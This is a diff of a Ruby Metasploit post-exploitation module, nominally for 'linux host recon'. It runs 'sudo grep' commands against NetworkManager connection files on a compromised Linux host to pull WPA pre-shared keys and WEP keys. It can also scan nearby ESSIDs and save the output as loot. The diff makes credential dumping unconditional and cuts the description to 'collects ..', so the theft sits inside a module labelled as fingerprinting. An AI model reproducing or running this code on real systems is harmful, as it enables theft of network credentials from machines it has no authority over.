@@ -20,9 +20,8 @@
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on       => set SESSION 3
-# Dump credentials from remote system?           => set DUMP_CREDS true
 # Store dumped data to msf4/loot folder?         => set STORE_LOOT true
-# Display list of ESSIDs emitting signal?        => set AGRESSIVE_DUMP true
+# Agressive system fingerprints scan?            => set AGRESSIVE_DUMP true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -87,7 +86,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'linux host recon post-module (fingeprint)',
                         'Description'   => %q{
-                                        This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target Linux machine using /etc/NetworkManager/system-connections/ files and displays a list of ESSIDs emitting signal (advanced option). This module also stores the dumped data into msf4/loot folder (advanced option).
+                                        This module collects ..
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -99,7 +98,7 @@ class MetasploitModule < Msf::Post
                         'DisclosureDate' => 'set 17 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'true',  # root privs required in non-Kali distros
+                        'Privileged'     => 'true',  # root privs required
                         'Targets'        =>
                                 [
                                          [ 'Linux' ]
@@ -120,100 +119,19 @@ class MetasploitModule < Msf::Post
  
                 register_options(
                         [
-                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('DUMP_CREDS', [ false, 'Dump credentials from remote system?', false])
+                                OptString.new('SESSION', [ true, 'The session number to run this module on'])
                         ], self.class)
 
                 register_advanced_options(
                         [
                                 OptBool.new('STORE_LOOT', [false, 'Store dumped data to msf4/loot folder?', false]),
-                                OptBool.new('AGRESSIVE_DUMP', [false, 'Display list of ESSIDs emitting signal?', false])
+                                OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false])
                         ], self.class)
  
         end
 
 
 
-#
-# DUMP WPA/WEP CREDENTIALS FROM TARGET ..
-#
-def ls_stage1
-
-  #
-  # check for proper config settings enter...
-  # to prevent 'unset all' from deleting default options...
-  #
-  if datastore['DUMP_CREDS'] == 'nil'
-    print_error("Options not configurated correctly ..")
-    print_warning("Please set DUMP_CREDS option ..")
-    return nil
-  else
-    print_status("Dumping remote wpa/wep credentials ..")
-    Rex::sleep(1.0)
-  end
-
-
-      #
-      # TODO: write better outputs ..
-      # Dump system information from target system (fingerprits)
-      #
-      data_dump=''
-      wpa_out = cmd_exec("sudo grep psk= #{rpath}/*")
-      wep_out = cmd_exec("sudo grep wep-key0= #{rpath}/*")
-      date_out = cmd_exec("date")
-      # store data in variable (loot funtion)
-      # data_dump << date_out
-      # data_dump << ""
-      # data_dump << "WPA CREDENTIALS:"
-      # data_dump << "----------------"
-      data_dump << wpa_out
-      # data_dump << "WEP CREDENTIALS:"
-      # data_dump << "----------------"
-      data_dump << wep_out
-      Rex::sleep(1.0)
-
-        #
-        # Display agressive scan results ..
-        #
-        if datastore['AGRESSIVE_DUMP'] == true
-          # Store interface in use (remote)
-          interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
-          # Executing interface scan (essids emitting)
-          essid_out = cmd_exec("sudo iwlist #{interface} scanning | grep ESSID:")
-          print_line("ESSIDs EMITING SIGNAL:")
-          print_line("----------------------")
-          print_line(essid_out)
-          print_line("")
-          Rex::sleep(0.5)
-          # store data into an variable to write logfile ..
-          # data_dump << essid_out
-        end
-
-
-          #
-          # Display results on screen ..
-          #
-          print_line("")
-          print_line(data_dump)
-          print_line("")
-          Rex::sleep(0.5)
-
-
-        #
-        # Store data to msf loot folder (local) ..
-        #
-        if datastore['STORE_LOOT'] == true
-          print_warning("Credentials stored in: ~/.msf4/loot (folder) ..")
-          store_loot("wpa_wep_credentials", "text/plain", session, data_dump, "wpa_wep_dump.txt", "output of wpa/wep dump")
-        end
-
-  #
-  # error exception funtion
-  #
-  rescue ::Exception => e
-  print_error("Error Running Command: #{e.class} #{e}")
-  print_warning("Try to privilege escalation before runing this module ..")
-end
 
 
 
@@ -279,11 +197,56 @@ def run
     end
 
 
-#
-# Selected settings to run
-#
-      if datastore['DUMP_CREDS']
-         ls_stage1
-      end
+      #
+      # TODO: write better outputs ..
+      # Dump system information from target system (fingerprints)
+      #
+      data_dump=''
+      # bash commands to be executed remotlly ..
+      dat_out = cmd_exec("date")
+      wpa_out = cmd_exec("sudo grep psk= #{rpath}/*")
+      wep_out = cmd_exec("sudo grep wep-key0= #{rpath}/*")
+      # store data into a variable to write the logfile ..
+      data_dump << dat_out
+      data_dump << ""
+      data_dump << "WPA CREDENTIALS:"
+      data_dump << "----------------"
+      data_dump << wpa_out
+      data_dump << "WEP CREDENTIALS:"
+      data_dump << "----------------"
+      data_dump << wep_out
+      Rex::sleep(1.0)
+
+        #
+        # Agressive scan results ..
+        #
+        if datastore['AGRESSIVE_DUMP'] == true
+          # Store interface in use (remote)
+          interface = cmd_exec("netstat -r | grep default | awk {'print $8'}")
+          # Executing interface scans (essids emitting)
+          essid_out = cmd_exec("sudo iwlist #{interface} scanning | grep ESSID:")
+          Rex::sleep(0.5)
+          # store data into an variable to write the logfile ..
+          data_dump << "LIST OF ESSIDs EMITING:"
+          data_dump << "-----------------------"
+          data_dump << essid_out
+        end
+
+          #
+          # Display results on screen ..
+          #
+          print_line("")
+          print_line(data_dump)
+          print_line("")
+          Rex::sleep(0.5)
+
+     #
+     # Store data into msf loot folder (local) ..
+     #
+     if datastore['STORE_LOOT'] == true
+       print_warning("Fingerprints stored in: ~/.msf4/loot (folder) ..")
+       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "output of linux_hostrecon")
+     end
+
    end
 end
